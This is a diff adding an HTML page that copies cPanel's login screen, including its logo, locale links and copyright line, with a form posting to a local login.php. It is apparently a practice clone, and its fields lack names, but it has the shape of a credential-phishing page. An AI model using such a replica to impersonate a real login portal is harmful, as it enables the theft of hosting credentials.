@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <title>cPanel Login</title>
+    <link href="Images\favicon.ico" rel="icon" type="image/x-icon">
+    <style>
+        .cpanellogo {
+           margin-top: 130px;
+        }
+        body{
+            background-color:whitesmoke;
+        }
+        .label{
+            margin-left:490px ;
+            font-family: "Open Sans", sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            color:#5c5959;
+        }
+        .username{
+           margin-left: 495px; 
+           height: 39px;
+           width:300px;
+           color: black;
+           font-family: "Open Sans", sans-serif;
+           font-size: 13px;
+           border: 2px solid #bebebe ;
+           padding: 0 10px;
+           margin-top: -10px;
+           border-radius: 4px;    
+        }
+       
+        #username
+        {
+            border: none;
+            background-color: transparent;
+            padding-top: 10px;
+            margin-left: 30px;
+        }
+        #icon-user
+        {
+            display: block;
+            margin-top: -20px;
+            font-size: 15px;
+            color:#bebebe ;
+        }
+
+        .button{
+            background-color: #179bd7;
+            width: 300px;
+            font-size: 13px;
+            font-family: "Open Sans", sans-serif;
+            font-weight: 600;
+            padding-top: 7px;
+            padding-bottom: 7px;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            border: 1px solid black ;
+            margin-left: 497px;
+        }
+        input{
+            background-color: white;
+        }
+        ul {
+            display: block;
+            list-style-type: disc;
+            margin-block-start: 1em;
+            margin-block-end: 1em;
+            margin-inline-start: 0px;
+            margin-inline-end: 0px;
+            padding-inline-start: 40px;
+            unicode-bidi: isolate;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            color: black;
+}
+li{
+    display: inline;
+    list-style: none;
+    margin-left: 34px;
+    color: black;
+    text-decoration: none;
+}
+.copyright
+{
+    color: #3f4143;
+    font-family: verdana;
+    font-size: 7pt;
+    margin-top: -40px;
+    padding-top: 30px;
+    text-align: center;
+}      
+</style>
+</head>
+
+<body>
+    <center><img class="cpanellogo" src="Images/cpanel-logo.png" alt="cPanel Logo" height="50px" width="237px"></center><br><br>
+    <label class="label">Username</label><br><br>
+<form method="post" action="login.php">
+    <div class="username">
+        <input type="text" placeholder="Enter your username." id="username" required>
+        <span class="glyphicon glyphicon-user" id="icon-user"></span>
+    </div><br><br>
+
+    <label class="label">Password</label><br><br>
+
+    <div class="username">
+        <input type="text" placeholder="Enter your password." id="username" required>
+        <span class="glyphicon glyphicon-lock" id="icon-user"></span>
+    </div><br><br>
+
+    <div>
+        <button class="button">Log in</button>
+    </div>
+   </form><br><br<br><br><br><br><br>
+<ul id="locales_list">                   
+    <li><a href="/?locale=ar">العربية</a></li>
+    <li><a href="/?locale=cs">čeština</a></li>
+    <li><a href="/?locale=da">dansk</a></li>
+    <li><a href="/?locale=de">Deutsch</a></li>
+    <li><a href="/?locale=el">Ελληνικά</a></li>
+    <li><a href="/?locale=es">español</a></li>
+    <li><a href="/?locale=es_419">español&nbsp;latinoamericano</a></li>
+    <li><a href="/?locale=es_es">español&nbsp;de&nbsp;España</a></li>
+</ul><br><br><br>
+
+<center><img src="Images/favicon.ico" height="25px"></center><br>
+<div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+
+</body>
+
+</html>
